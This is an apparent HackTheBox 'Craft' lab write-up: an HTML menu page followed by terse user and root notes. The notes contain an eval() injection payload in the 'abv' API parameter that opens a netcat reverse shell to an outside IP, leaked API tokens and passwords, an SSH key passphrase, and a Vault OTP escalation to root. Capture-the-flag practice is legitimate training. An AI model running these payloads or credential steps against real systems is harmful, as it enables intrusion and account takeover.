<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <title>V01t4ic's HTB Write-ups</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" 
            integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
        <link href="css/style.css" rel="stylesheet">
        <meta name="description" content="Pen-testing Write-ups and Cheatsheets">
    </head>
    <body>
        <div class="container">
            <header>
                <nav>
                    <div class="container pt-5 px-5 d-flex flex-column flex-md-row justify-content-between bg-white" id="navHeader">
                        <a class="d-none d-md-inline-block" href='about.html'>About</a>
                        <a class="d-none d-md-inline-block" href='cheatsheet.html'>Cheatsheet</a>
                        <a class="d-none d-md-inline-block" data-toggle="collapse" data-target="#writeupsMenu" 
                            aria-controls="writeupsMenu" aria-expanded="false" aria-label="Toggle writeups menu" href="#">Write-ups</a>
                    </div>
                    <div class="collapse bg-white" id="writeupsMenu">
                        <div class="container pt-1 px-5 flex-md-row bg-white">
                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-zetta.html'>HTB :: Zetta</a>
                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-registry.html'>HTB :: Registry</a>
                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-craft.html'>HTB :: Craft</a>
                        </div>
                    </div>
                </nav>
            </header>
            <main>
            </main>
        </div>
        <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" 
            integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" 
            integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" 
            integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
    </body>
</html>
### USER.txt


added added craft.htb api.craft.htb gogs.craft.htb to /etc/hosts

found in gogs repo: issues:
# curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'


found in commits: (https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1)
# response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False

using repo to get reverse: 
abv parameter uses eval() for user input.
eval(__import__('os').system('nc -e /bin/sh 10.10.12.142 4006') or 2 > 1)

root in jail:
in dbtest.py change fetchone() to fetchall() to see 'user' table

from database:
???:ebachman:llJ77D8QFkLPQB
???:gilfoyle:ZEU3N8WNM2rh4T


got id_rsa from gilfoyle's private repo on gogs:
ssh -i id_rsa gilfoyle@10.10.10.110 
passphrase:ZEU3N8WNM2rh4T

### ROOT.txt

in gilfoyle's private repo there is 'vault' dir and 'secrets.sh':
vault secrets enable ssh
vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0

vault can be opened using token in user's home dir:
gilfoyle@craft:~$ vault login token=$(cat .vault-token)
Success! You are now authenticated. 

vault ssh root@localhost (you could run it just out of user's shell, no 'vault login' step needed)
...
a lot of text
...
OTP for the session is: 2a16b221-042a-bc4a-0c8f-0235c50d5481

where OTP = one time password
password: 2a16b221-042a-bc4a-0c8f-0235c50d5481


got root:
root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)
root@craft:~# 


